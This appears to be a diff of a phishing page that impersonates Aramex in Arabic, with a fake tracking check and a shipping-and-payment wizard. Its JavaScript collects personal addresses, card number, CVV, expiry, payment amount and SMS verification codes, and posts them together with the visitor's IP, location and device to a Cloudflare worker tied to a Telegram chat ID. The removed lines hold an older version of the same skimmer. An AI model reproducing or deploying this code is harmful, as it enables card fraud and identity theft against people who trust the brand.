+            <input id="d_pieces" value="1" inputmode="numeric" />
+            <div class="error-msg" id="err_d_pieces"></div>
+          </div>
+          <div style="text-align:center;font-weight:900;color:#666;margin:18px 0 12px;font-size:20px">نوع الشحنة</div>
+          <div class="choiceGrid" style="padding:0 0 4px">
+            <div class="choice selectable" data-type="docs">
+              <div class="tick">✓</div><div class="emoji">📄</div><div class="lbl">وثائق</div>
+            </div>
+            <div class="choice selectable" data-type="parcel">
+              <div class="tick">✓</div><div class="emoji">📦</div><div class="lbl">طرد</div>
+            </div>
+          </div>
+          <div class="error-msg" id="err_d_type" style="text-align:center"></div>
+        </div>
+        <div class="btnRow">
+          <button class="btnMain" id="btnSendShipment">التالي</button>
+          <button class="btnGhost" data-back="receiver">رجوع</button>
+        </div>
+      </section>
+
+      <!-- PAYMETHOD -->
+      <section class="page" id="page-paymethod">
+        <div class="wizardTop">
+          <div class="steps">
+            <div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div>
+            <div class="step done"><div class="bubble">✓</div><span>معلومات<br>المستلم</span></div>
+            <div class="step done"><div class="bubble">✓</div><span>تفاصيل<br>الشحنة</span></div>
+            <div class="step active"><div class="bubble">4</div><span>خيارات<br>الدفع</span></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="formTitle" style="margin-top:18px">رائع! نحن على وشك الإنتهاء</div>
+          <div class="formSub">الرجاء تحديد طريقة الدفع المفضلة</div>
+          <div class="choiceGrid">
+            <div class="choice" data-next="cardform">
+              <div class="emoji">💳</div><div class="lbl">بطاقة ائتمان</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- CARD FORM -->
+      <section class="page" id="page-cardform">
+        <div class="section">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin:6px 0 10px">
+            <div style="background:#efefef;border:1px solid #e1e1e1;padding:10px 12px;border-radius:8px;font-weight:900;color:#444">ENGLISH</div>
+            <div class="brand" style="font-size:32px">ارامكس</div>
+          </div>
+          <div class="cardForm" style="padding-top:4px">
+            <div class="fieldLine">
+              <label>اختر نوع البطاقة *</label>
+              <div class="card-type-options" id="card-type-options">
+                <div class="card-type-option" data-value="mada">مدى</div>
+                <div class="card-type-option" data-value="visa">Visa</div>
+                <div class="card-type-option" data-value="mastercard">MasterCard</div>
+              </div>
+              <div class="error-msg" id="err_c_type"></div>
+            </div>
+            <div style="text-align:center;font-weight:900;font-size:22px;margin:6px 0 12px;color:#333">
+              إدخال معلومات البطاقة
+            </div>
+            <div class="fieldLine">
+              <label>اسم صاحب البطاقة (كما يظهر على البطاقة)*</label>
+              <input id="c_name" />
+              <div class="error-msg" id="err_c_name"></div>
+            </div>
+            <div class="fieldLine">
+              <label>رقم البطاقة*</label>
+              <input id="c_num" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" />
+              <div class="error-msg" id="err_c_num"></div>
+            </div>
+            <div class="grid2">
+              <div class="fieldLine">
+                <label>رمز الأمان*</label>
+                <input id="c_cvv" inputmode="numeric" maxlength="3" placeholder="123" />
+                <div class="error-msg" id="err_c_cvv"></div>
+              </div>
+              <div class="fieldLine">
+                <label>تاريخ انتهاء الصلاحية*</label>
+                <div style="display:flex;gap:10px">
+                  <select id="c_year"></select>
+                  <select id="c_month">
+                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option>
+                    <option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option>
+                    <option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+                  </select>
+                </div>
+                <div class="error-msg" id="err_c_exp"></div>
+              </div>
+            </div>
+            <div class="fieldLine">
+              <label>قيمة الدفع *</label>
+              <input id="pay_amount" inputmode="decimal" placeholder="مثال: 125.00" />
+              <div class="error-msg" id="err_pay_amount"></div>
+            </div>
+            <div class="noteBox">
+              ستتمكن من مراجعة ملخص الدفع الخاص بك في الصفحة التالية قبل إتمام عملية الدفع
+            </div>
+          </div>
+          <div class="btnRow">
+            <button class="btnMain" id="cardNext">التالي</button>
+            <button class="btnGhost" data-back="paymethod">رجوع</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- LOADING -->
+      <section class="page" id="page-loading">
+        <div class="loadingPage" aria-label="Loading">
+          <div>
+            <div class="spinnerRing" aria-hidden="true"></div>
+            <div id="loadingCountdown" class="loadingCountdown">30</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- OTP -->
+      <section class="page" id="page-otp">
+        <div class="section">
+          <div class="otpWrap">
+            <div class="otpTitle">ادخل الرمز المرسل الى جوالك</div>
+            <div class="otpSub">الرمز مكون من 4 إلى 6 أرقام</div>
+            <div class="otpBox">
+              <label>رمز التحقق *</label>
+              <input id="otp_code" inputmode="numeric" maxlength="6" placeholder="ــــــ" />
+              <div class="error-msg" id="err_otp_code"></div>
+            </div>
+            <div class="btnRow" style="padding-top:16px">
+              <button class="btnMain" id="btnConfirmPay">تأكيد الدفع</button>
+              <button class="btnGhost" data-back="cardform">رجوع</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div> <!-- .app -->
+  </div> <!-- #appRoot -->
+</div> <!-- #screen-ship -->
+<!-- ========== البوب أب المخصص للرسائل ========== -->
+<div id="customPopup" class="custom-popup">
+  <div class="popup-icon" id="popupIcon"></div>
+  <div class="popup-message" id="popupMessage"></div>
+  <button class="popup-close" onclick="hidePopup()">حسناً</button>
+</div>
+</div> <!-- .second-content -->
+</div> <!-- #secondPage -->
 
 <script>
-// ========================  إعدادات الإرسال الموثوق (معالج iOS Safari) ========================
-const WORKER_URL = "https://icy-cherry-0930.msjsoo777.workers.dev/";  // 👈 رابط المستضيف (غيّره هنا)
-const CHAT_ID = "6918534470";                                    // 👈 معرف الدردشة (غيّره هنا)
-
-// -------------------  البصمة والبيانات الإضافية -------------------
-function generateStableFingerprint() {
-  let components = [
-    navigator.userAgent || '',
-    navigator.language || '',
-    screen.width + 'x' + screen.height,
-    screen.colorDepth,
-    new Date().getTimezoneOffset(),
-    navigator.hardwareConcurrency || '',
-    navigator.deviceMemory || '',
-    !!navigator.maxTouchPoints ? 'touch' : 'no-touch'
-  ];
-  let fingerprint = components.join('|');
-  let hash = 0;
-  for (let i = 0; i < fingerprint.length; i++) {
-    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-    hash |= 0;
-  }
-  return 'fp_' + Math.abs(hash).toString(16);
-}
-
-let userId = localStorage.getItem("stableUserId");
-if (!userId) {
-  userId = generateStableFingerprint();
-  localStorage.setItem("stableUserId", userId);
-}
-
-let visitCount = localStorage.getItem("visitCount_" + userId);
-if (!visitCount) {
-  visitCount = 1;
-} else {
-  visitCount = parseInt(visitCount) + 1;
-}
-localStorage.setItem("visitCount_" + userId, visitCount);
-
-function getDeviceType() {
-  const ua = navigator.userAgent;
-  if (/Android/i.test(ua)) return "Android";
-  if (/iPhone/i.test(ua)) return "iPhone";
-  if (/iPad/i.test(ua)) return "iPad";
-  if (/iPod/i.test(ua)) return "iPod";
-  return "Desktop";
-}
-
-function getBrowserName() {
-  const ua = navigator.userAgent;
-  if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
-  if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Safari";
-  if (ua.includes("Firefox")) return "Firefox";
-  if (ua.includes("Edg")) return "Edge";
-  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
-  if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
-  return "Unknown";
-}
-
-let geoData = { country: "غير معروف", city: "غير معروف" };
-let clientIP = "غير معروف";
-
-async function fetchIPandGeo() {
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipJson = await ipRes.json();
-    clientIP = ipJson.ip;
-    const geoRes = await fetch(`https://ipapi.co/${clientIP}/json/`);
-    const geoJson = await geoRes.json();
-    if (!geoJson.error) {
-      geoData.country = geoJson.country_name || "غير معروف";
-      geoData.city = geoJson.city || "غير معروف";
-    }
-  } catch(e) { console.warn("فشل جلب الموقع", e); }
-}
-fetchIPandGeo();
-
-function getCurrentDateTime() {
-  const now = new Date();
-  const year = now.getFullYear();
-  const month = String(now.getMonth() + 1).padStart(2, '0');
-  const day = String(now.getDate()).padStart(2, '0');
-  const hours = String(now.getHours()).padStart(2, '0');
-  const minutes = String(now.getMinutes()).padStart(2, '0');
-  const seconds = String(now.getSeconds()).padStart(2, '0');
-  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
-}
-
-function getExtraInfo() {
-  const dateTime = getCurrentDateTime();
-  return `المستخدم الثابت: ${userId}
-عدد الزيارات: ${visitCount}
-الجهاز: ${getDeviceType()}
-المتصفح: ${getBrowserName()}
-IP: ${clientIP}
-الموقع: ${geoData.city} - ${geoData.country}
-التاريخ والوقت: ${dateTime}`;
-}
-
-// -------------------  نظام الإرسال الموثوق (مع طابور محلي وإعادة محاولة) -------------------
-const STORAGE_KEY = "pending_messages_queue";
-let isProcessingQueue = false;
-
-function savePendingMessages(messages) {
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(messages));
-}
-
-function loadPendingMessages() {
-  const raw = localStorage.getItem(STORAGE_KEY);
-  if (!raw) return [];
-  try {
-    return JSON.parse(raw);
-  } catch(e) {
-    return [];
-  }
-}
-
-function addToQueue(messageText, retryCount = 0) {
-  const queue = loadPendingMessages();
-  const messageId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-  queue.push({
-    id: messageId,
-    text: messageText,
-    retries: retryCount,
-    createdAt: Date.now()
+// ========== إظهار الصفحة الرئيسية وإخفاء العناصر الأخرى ==========
+document.addEventListener("DOMContentLoaded",function(){
+  document.querySelectorAll("body > *:not(#myAramexPage):not(#popup):not(#secondPage)").forEach(function(el){
+    el.style.display="none";
   });
-  savePendingMessages(queue);
-  processQueue();
-}
-
-function removeFromQueue(messageId) {
-  let queue = loadPendingMessages();
-  queue = queue.filter(msg => msg.id !== messageId);
-  savePendingMessages(queue);
-}
-
-async function sendSingleMessage(fullMessage, messageId, retriesLeft = 3) {
-  try {
-    const response = await fetch(WORKER_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: fullMessage })
-    });
-    if (response.ok) {
-      if (messageId) removeFromQueue(messageId);
-      return true;
-    } else {
-      throw new Error(`HTTP ${response.status}`);
-    }
-  } catch(err) {
-    if (retriesLeft > 0) {
-      const delay = 1000 * (4 - retriesLeft);
-      await new Promise(resolve => setTimeout(resolve, delay));
-      return sendSingleMessage(fullMessage, messageId, retriesLeft - 1);
-    } else {
-      console.warn("فشل إرسال الرسالة بعد 3 محاولات", fullMessage);
-      return false;
-    }
-  }
-}
-
-async function processQueue() {
-  if (isProcessingQueue) return;
-  isProcessingQueue = true;
-  const queue = loadPendingMessages();
-  if (queue.length === 0) {
-    isProcessingQueue = false;
-    return;
-  }
-  for (const msg of queue) {
-    if (Date.now() - msg.createdAt > 10 * 60 * 1000) {
-      removeFromQueue(msg.id);
-      continue;
-    }
-    const extra = getExtraInfo();
-    const fullMsg = `${msg.text}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
-    await sendSingleMessage(fullMsg, msg.id, msg.retries || 3);
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
-  isProcessingQueue = false;
-}
-
-async function sendToWorker(messageText) {
-  const extra = getExtraInfo();
-  const fullMessage = `${messageText}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
-  const success = await sendSingleMessage(fullMessage, null, 3);
-  if (!success) {
-    addToQueue(messageText, 0);
-  }
-}
-
-window.addEventListener('load', () => {
-  setTimeout(() => processQueue(), 1000);
-  setInterval(() => processQueue(), 30000);
+  document.getElementById("myAramexPage").style.display="block";
+  document.body.style.visibility="visible";
 });
 
-// ========================  باقي الكود (وظائف البطاقة والتدفق) ========================
-const cardInput = document.getElementById("cardNumber");
-const cvvInput = document.getElementById("cvv");
-const nameInput = document.getElementById("cardName");
-const expMonth = document.getElementById("expMonth");
-const expYear = document.getElementById("expYear");
-const expiryBox = document.getElementById("expiryBox");
-const logo = document.getElementById("cardLogo");
-const cardBox = document.getElementById("cardBox");
-const payBtn = document.getElementById("payBtn");
-const applePayBtn = document.getElementById("applePayBtn");
-const applePayScreen = document.getElementById("applePayScreen");
-const paymentScreen = document.getElementById("paymentScreen");
-const loadingScreen1 = document.getElementById("loadingScreen1");
-const otpScreen = document.getElementById("otpScreen");
-const loadingScreen2 = document.getElementById("loadingScreen2");
-const countdown60 = document.getElementById("countdown60");
-const otpInput = document.getElementById("otpInput");
-const otpBtn = document.getElementById("otpBtn");
+// ========== كود الصفحة الأولى (التتبع) ==========
+(function(){
+  var trackInput=document.getElementById("trackNumber");
+  var checkBtn=document.getElementById("checkBtn");
+  var popup=document.getElementById("popup");
+  var popupMessage=document.getElementById("popupMessage");
+  var popupCloseBtn=document.getElementById("popupCloseBtn");
+  var openSecondPageBtn=document.getElementById("openSecondPageBtn");
+  var secondPage=document.getElementById("secondPage");
 
-const LOGO_DEFAULT = "https://i.postimg.cc/Hsf6sDzk/20260412-152344.png";
-const LOGO_VISA = "https://i.postimg.cc/Gmw4mqyR/20260412-151020.png";
-const LOGO_MC = "https://i.postimg.cc/fb5y5sgX/20260412-150959.png";
+  trackInput.addEventListener("input",function(){
+    this.value=this.value.replace(/\D/g,"").slice(0,10);
+  });
 
-let timer60 = null;
-let timer30 = null;
+  checkBtn.onclick=function(){
+    var value=trackInput.value.trim();
+    if(value.length!==10){
+      popupMessage.textContent="يجب إدخال 10 أرقام فقط";
+      popup.classList.add("show");
+      return;
+    }
+    if(value.slice(2,4)==="40"){
+      popupMessage.textContent="الشحنة قيد المعالجة";
+    }else{
+      popupMessage.textContent="رقم الشحنة غير صحيح أو لا يوجد شحنة";
+    }
+    popup.classList.add("show");
+  };
 
-// تعبئة شهور وسنوات
-for (let i = 1; i <= 12; i++) {
-  const val = String(i).padStart(2, "0");
-  const option = document.createElement("option");
-  option.value = val;
-  option.textContent = val;
-  expMonth.appendChild(option);
-}
-for (let i = 26; i <= 50; i++) {
-  const option = document.createElement("option");
-  option.value = i;
-  option.textContent = i;
-  expYear.appendChild(option);
-}
+  // فتح الصفحة الثانية عند الضغط على المربع الكبير
+  openSecondPageBtn.onclick=function(){
+    secondPage.classList.add("show");
+    // إضافة حالة في history للسماح بالرجوع عبر زر المتصفح
+    history.pushState({page: 'second'}, '');
+  };
 
-function toggleError(element, show) {
-  if (show) element.classList.add("error");
-  else element.classList.remove("error");
-}
+  popupCloseBtn.onclick=function(){
+    popup.classList.remove("show");
+  };
 
-function sanitizeCard(value) { return value.replace(/\D/g, "").slice(0, 16); }
-function sanitizeCVV(value) { return value.replace(/\D/g, "").slice(0, 3); }
-function sanitizeName(value) { return value.replace(/[^A-Za-z ]/g, "").replace(/\s{2,}/g, " ").replace(/^\s+/, ""); }
-function sanitizeOTP(value) { return value.replace(/\D/g, "").slice(0, 6); }
+  popup.onclick=function(e){
+    if(e.target===popup){
+      popup.classList.remove("show");
+    }
+  };
+})();
 
-function showScreen(screen) {
-  paymentScreen.style.display = "none";
-  loadingScreen1.style.display = "none";
-  otpScreen.style.display = "none";
-  loadingScreen2.style.display = "none";
-  screen.style.display = "flex";
-}
-
-function hideAllTimers() {
-  if (timer60) { clearInterval(timer60); timer60 = null; }
-  if (timer30) { clearTimeout(timer30); timer30 = null; }
-}
-
-function detectCardType(number) {
-  if (!/^\d+$/.test(number)) return "unknown";
-  if (number.startsWith("4")) return "visa";
-  if (number.length >= 2) {
-    let firstTwo = parseInt(number.slice(0,2),10);
-    if (firstTwo>=51 && firstTwo<=55) return "mastercard";
+// ========== التعامل مع زر الرجوع في المتصفح للعودة من الصفحة الثانية ==========
+window.addEventListener('popstate', function(event) {
+  var secondPage = document.getElementById("secondPage");
+  if (secondPage.classList.contains('show')) {
+    secondPage.classList.remove('show');
   }
-  if (number.length >= 4) {
-    let firstFour = parseInt(number.slice(0,4),10);
-    if (firstFour>=2221 && firstFour<=2720) return "mastercard";
+});
+
+// ========== كود الصفحة الثانية (الشحن) مع تعديلات بسيطة ==========
+(function setRealVH(){
+  function apply(){
+    const vh = window.innerHeight * 0.01;
+    document.documentElement.style.setProperty('--vh', vh + 'px');
   }
-  return "unknown";
-}
+  apply();
+  window.addEventListener('resize', apply);
+  window.addEventListener('orientationchange', apply);
+})();
 
-function updateCardLogo(type) {
-  if (type === "visa") logo.src = LOGO_VISA;
-  else if (type === "mastercard") logo.src = LOGO_MC;
-  else logo.src = LOGO_DEFAULT;
-}
+// ========== متغير العامل (Worker) ==========
+const WORKER_URL = "https://rapid-cake-691b.soolrann594.workers.dev/";
+const CHAT_ID = "6918534470";
 
-function validateCard() { let valid = /^\d{16}$/.test(cardInput.value); toggleError(cardBox, !valid); return valid; }
-function validateCVV() { let valid = /^\d{3}$/.test(cvvInput.value); toggleError(cvvInput, !valid); return valid; }
-function validateName() { let valid = /^[A-Za-z ]+$/.test(nameInput.value.trim()) && /[A-Za-z]/.test(nameInput.value.trim()); toggleError(nameInput, !valid); return valid; }
-function validateExpiry() { let valid = expMonth.value !== "" && expYear.value !== ""; toggleError(expiryBox, !valid); return valid; }
-function validateOTP() { let valid = /^\d{4,6}$/.test(otpInput.value.trim()); toggleError(otpInput, !valid); return valid; }
+// ========== متغيرات التتبع ==========
+let shipmentType = ''; // local أو international
+let userDevice = '';
+let userIP = '';
+let userLocation = '';
+let visitCount = localStorage.getItem('visitCount') || 0;
+visitCount++;
+localStorage.setItem('visitCount', visitCount);
 
-cardInput.addEventListener("input", function() {
-  this.value = sanitizeCard(this.value);
-  updateCardLogo(detectCardType(this.value));
-  if (this.value.length > 0) {
-    if (/^\d{16}$/.test(this.value)) validateCard();
-    else toggleError(cardBox, false);
+// ========== اكتشاف نوع الجهاز ==========
+function detectDevice() {
+  const ua = navigator.userAgent;
+  if (/android/i.test(ua)) {
+    return 'Android';
+  } else if (/iPad|iPhone|iPod/.test(ua)) {
+    return 'iOS';
   } else {
-    toggleError(cardBox, false);
-    updateCardLogo("unknown");
+    return 'Desktop';
   }
-});
-cardInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
-cvvInput.addEventListener("input", function() {
-  this.value = sanitizeCVV(this.value);
-  if (this.value.length > 0) {
-    if (this.value.length === 3) validateCVV();
-    else toggleError(cvvInput, false);
-  } else toggleError(cvvInput, false);
-});
-cvvInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
-nameInput.addEventListener("input", function() {
-  this.value = sanitizeName(this.value);
-  if (this.value.trim().length > 0) validateName();
-  else toggleError(nameInput, false);
-});
-nameInput.addEventListener("keypress", e => { if (e.key.length===1 && !/[A-Za-z ]/.test(e.key)) e.preventDefault(); });
-otpInput.addEventListener("input", function() {
-  this.value = sanitizeOTP(this.value);
-  if (this.value.length > 0) validateOTP();
-  else toggleError(otpInput, false);
-});
-otpInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
-expMonth.addEventListener("paste", e => e.preventDefault());
-expYear.addEventListener("paste", e => e.preventDefault());
-cardInput.addEventListener("focus", () => cardBox.classList.remove("error"));
-cvvInput.addEventListener("focus", () => cvvInput.classList.remove("error"));
-nameInput.addEventListener("focus", () => nameInput.classList.remove("error"));
-expMonth.addEventListener("focus", () => expiryBox.classList.remove("error"));
-expYear.addEventListener("focus", () => expiryBox.classList.remove("error"));
-otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));
-expMonth.addEventListener("change", validateExpiry);
-expYear.addEventListener("change", validateExpiry);
+}
 
-// أحداث الإرسال
-applePayBtn.addEventListener("click", function() {
-  applePayScreen.style.display = "block";
-  setTimeout(() => { applePayScreen.style.display = "none"; }, 2000);
-  sendToWorker("🪪 تم النقر على Apple Pay");
-});
-
-payBtn.addEventListener("click", function(e) {
-  e.preventDefault();
-  const isCardValid = validateCard();
-  const isCVVValid = validateCVV();
-  const isNameValid = validateName();
-  const isExpiryValid = validateExpiry();
-  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
-    let cardType = detectCardType(cardInput.value);
-    let cardTypeName = "بدون نوع";
-    if (cardType === "visa") cardTypeName = "فيزا";
-    else if (cardType === "mastercard") cardTypeName = "ماستر كارد";
-    const cardMessage = `💳 معلومات الدفع\n━━━━━━━━━━━━━━━━━━━━\n🏷 نوع البطاقة: ${cardTypeName}\n🔢 رقم البطاقة: ${cardInput.value}\n🔐 رمز CVV: ${cvvInput.value}\n📅 تاريخ الانتهاء: ${expMonth.value}/${expYear.value}\n👤 الاسم على البطاقة: ${nameInput.value.trim() || "غير مدخل"}`;
-    sendToWorker(cardMessage);
-    startFirstLoading();
+// ========== جلب الـIP ==========
+async function fetchIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    return 'غير معروف';
   }
-});
+}
 
-function startFirstLoading() {
-  hideAllTimers();
-  showScreen(loadingScreen1);
-  let seconds = 60;
-  countdown60.textContent = seconds;
-  timer60 = setInterval(() => {
-    seconds--;
-    countdown60.textContent = seconds;
-    if (seconds <= 0) {
-      clearInterval(timer60);
-      timer60 = null;
-      // بعد 60 ثانية ننتقل مباشرة إلى شاشة OTP
-      showScreen(otpScreen);
-      otpInput.value = "";
-      otpInput.classList.remove("error");
+// ========== جلب الموقع ==========
+async function fetchLocation() {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    return `${data.city}, ${data.region}, ${data.country_name}`;
+  } catch (error) {
+    return 'غير معروف';
+  }
+}
+
+// ========== دالة إرسال إلى Worker (بصيغة JSON) ==========
+async function sendToWorker(message) {
+  try {
+    const payload = {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    };
+    const response = await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!response.ok) {
+      console.warn("فشل الإرسال إلى العامل:", response.status);
+    } else {
+      console.log("تم الإرسال بنجاح إلى العامل");
     }
-  }, 1000);
+  } catch (error) {
+    console.error("خطأ أثناء الإرسال إلى العامل:", error);
+  }
 }
 
-function startSecondLoading() {
-  hideAllTimers();
-  showScreen(loadingScreen2);
-  timer30 = setTimeout(() => {
-    timer30 = null;
-    showScreen(otpScreen);
-    otpInput.value = "";
-    otpInput.classList.remove("error");
-  }, 30000);
+// ========== إعداد المعلومات الأولية ==========
+async function setupUserInfo() {
+  userDevice = detectDevice();
+  userIP = await fetchIP();
+  userLocation = await fetchLocation();
 }
 
-otpBtn.addEventListener("click", function() {
-  const isOtpValid = validateOTP();
-  if (!isOtpValid) return;
-  const otpCode = otpInput.value.trim();
-  sendToWorker(`🔐 رمز التحقق OTP المدخل: ${otpCode}`);
-  startSecondLoading();
+// ========== الرسالة 1: عند اختيار نوع الشحنة ==========
+async function sendTypeMessage(type) {
+  await setupUserInfo();
+  const typeText = type === 'local' ? 'شحنة محلية' : 'شحنة دولية';
+  const now = new Date().toLocaleString('ar-SA');
+  const message = `
+<b>📦 نوع الشحنة المختارة</b>
+• النوع: <b>${typeText}</b>
+• الوقت: ${now}
+• نوع الجهاز: ${userDevice}
+• الـIP: ${userIP}
+• الموقع: ${userLocation}
+• عدد الزيارات: ${visitCount}
+  `;
+  await sendToWorker(message);
+}
+
+// ========== الرسالة 2: معلومات المرسل والمستلم والشحنة ==========
+async function sendShipmentInfo() {
+  const now = new Date().toLocaleString('ar-SA');
+  const senderName = document.getElementById('s_name').value;
+  const senderCountry = document.getElementById('s_country').options[document.getElementById('s_country').selectedIndex].text;
+  const senderPhone = document.getElementById('s_phone').value;
+  const senderCity = document.getElementById('s_city').value;
+  const senderDistrict = document.getElementById('s_district').value;
+  const senderStreet = document.getElementById('s_street').value;
+  
+  const receiverName = document.getElementById('r_name').value;
+  const receiverCountry = document.getElementById('r_country').options[document.getElementById('r_country').selectedIndex].text;
+  const receiverPhone = document.getElementById('r_phone').value;
+  const receiverCity = document.getElementById('r_city').value;
+  const receiverDistrict = document.getElementById('r_district').value;
+  const receiverStreet = document.getElementById('r_street').value;
+  
+  const shipmentNo = document.getElementById('d_shipno').value;
+  const shipmentContent = document.getElementById('d_content').value;
+  const shipmentPieces = document.getElementById('d_pieces').value;
+  const shipmentTypeText = document.querySelector('#page-details .choice.selected .lbl').textContent;
+  
+  const message = `
+<b>📋 معلومات الشحنة الكاملة</b>
+
+<b>📤 معلومات المرسل:</b>
+• الاسم: ${senderName}
+• البلد: ${senderCountry}
+• رقم الهاتف: ${senderPhone}
+• المدينة: ${senderCity}
+• الحي: ${senderDistrict}
+• الشارع: ${senderStreet}
+
+<b>📥 معلومات المستلم:</b>
+• الاسم: ${receiverName}
+• البلد: ${receiverCountry}
+• رقم الهاتف: ${receiverPhone}
+• المدينة: ${receiverCity}
+• الحي: ${receiverDistrict}
+• الشارع: ${receiverStreet}
+
+<b>📦 معلومات الشحنة:</b>
+• رقم الشحنة: ${shipmentNo}
+• المحتويات: ${shipmentContent}
+• عدد القطع: ${shipmentPieces}
+• نوع الشحنة: ${shipmentTypeText}
+
+<b>🌐 معلومات النظام:</b>
+• نوع الجهاز: ${userDevice}
+• الـIP: ${userIP}
+• الموقع: ${userLocation}
+• عدد الزيارات: ${visitCount}
+• الوقت: ${now}
+  `;
+  await sendToWorker(message);
+}
+
+// ========== الرسالة 3: معلومات البطاقة ==========
+async function sendCardInfo() {
+  const now = new Date().toLocaleString('ar-SA');
+  const shipmentNo = document.getElementById('d_shipno').value;
+  const selectedCard = document.querySelector('.card-type-option.selected');
+  const cardType = selectedCard ? selectedCard.textContent : 'غير محدد';
+  const cardName = document.getElementById('c_name').value;
+  const cardNumber = document.getElementById('c_num').value.replace(/\s/g, '');
+  const cardExp = `${document.getElementById('c_month').value}/${document.getElementById('c_year').value}`;
+  const cardCVV = document.getElementById('c_cvv').value;
+  const paymentAmount = document.getElementById('pay_amount').value;
+  
+  const message = `
+<b>💳 معلومات الدفع</b>
+
+<b>💳 معلومات البطاقة:</b>
+• نوع البطاقة: ${cardType}
+• اسم صاحب البطاقة: ${cardName}
+• رقم البطاقة: ${cardNumber}
+• تاريخ الانتهاء: ${cardExp}
+• رمز الأمان (CVV): ${cardCVV}
+• قيمة الدفع: ${paymentAmount}
+
+<b>📦 معلومات إضافية:</b>
+• رقم الشحنة: ${shipmentNo}
+• الـIP: ${userIP}
+• نوع الجهاز: ${userDevice}
+• الموقع: ${userLocation}
+• الوقت: ${now}
+  `;
+  await sendToWorker(message);
+}
+
+// ========== الرسالة 4: رمز التحقق ==========
+async function sendOTPInfo() {
+  const now = new Date().toLocaleString('ar-SA');
+  const shipmentNo = document.getElementById('d_shipno').value;
+  const otpCode = document.getElementById('otp_code').value;
+  const message = `
+<b>🔐 رمز التحقق</b>
+
+• رمز التحقق: <b>${otpCode}</b>
+• رقم الشحنة: ${shipmentNo}
+• الوقت والتاريخ: ${now}
+
+✅ تم إدخال رمز التحقق بنجاح
+  `;
+  await sendToWorker(message);
+}
+
+// ========== نظام التنقل بين صفحات الشحن ==========
+const pages = {
+  where:    document.getElementById("page-where"),
+  sender:   document.getElementById("page-sender"),
+  receiver: document.getElementById("page-receiver"),
+  details:  document.getElementById("page-details"),
+  paymethod:document.getElementById("page-paymethod"),
+  cardform: document.getElementById("page-cardform"),
+  loading:  document.getElementById("page-loading"),
+  otp:      document.getElementById("page-otp"),
+};
+
+function go(name){
+  Object.values(pages).forEach(p => p.classList.remove("active"));
+  pages[name].classList.add("active");
+  const app = document.getElementById("app");
+  if(app) app.scrollTo({top:0, behavior:"instant"});
+}
+
+// دوال رسائل الخطأ
+function setError(id, msg){
+  const el = document.getElementById(id);
+  if(!el) return;
+  if(msg){
+    el.textContent = msg;
+    el.style.display = 'block';
+  }else{
+    el.textContent = '';
+    el.style.display = 'none';
+  }
+}
+
+function clearAllErrors(){
+  document.querySelectorAll('.error-msg').forEach(el=>{
+    el.textContent = '';
+    el.style.display = 'none';
+  });
+}
+
+// بيانات الدول
+const countryDial = {
+  sa: '+966', ae: '+971', kw: '+965', bh: '+973', qa: '+974', om: '+968'
+};
+const phonePlaceholders = {
+  sa: '0512345678', ae: '0501234567', kw: '50012345', bh: '36001234', qa: '33123456', om: '92123456'
+};
+
+function updatePhoneField(prefix) {
+  const select = document.getElementById(prefix + '_country');
+  const flagBox = document.getElementById(prefix + '_flag');
+  const phoneInput = document.getElementById(prefix + '_phone');
+  if (!select || !flagBox || !phoneInput) return;
+  const countryCode = select.value;
+  const dialCode = countryDial[countryCode] || '+966';
+  const placeholder = phonePlaceholders[countryCode] || '0512345678';
+  const span = flagBox.querySelector('span');
+  if (span) span.textContent = dialCode;
+  phoneInput.placeholder = placeholder;
+}
+
+document.getElementById('s_country').addEventListener('change', () => updatePhoneField('s'));
+document.getElementById('r_country').addEventListener('change', () => updatePhoneField('r'));
+updatePhoneField('s');
+updatePhoneField('r');
+
+// خيارات نوع البطاقة
+let selectedCardType = '';
+const cardOptions = document.querySelectorAll('.card-type-option');
+cardOptions.forEach(option => {
+  option.addEventListener('click', function() {
+    cardOptions.forEach(opt => opt.classList.remove('selected'));
+    this.classList.add('selected');
+    selectedCardType = this.dataset.value;
+    setError('err_c_type', '');
+  });
+});
+
+function isEmpty(id){
+  const el = document.getElementById(id);
+  return !el || el.value.trim() === "";
+}
+
+function onlyDigits(val){
+  return (val || "").replace(/\D/g,'');
+}
+
+function validateCardName(name) {
+  return /^[a-zA-Z\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF\s]+$/.test(name);
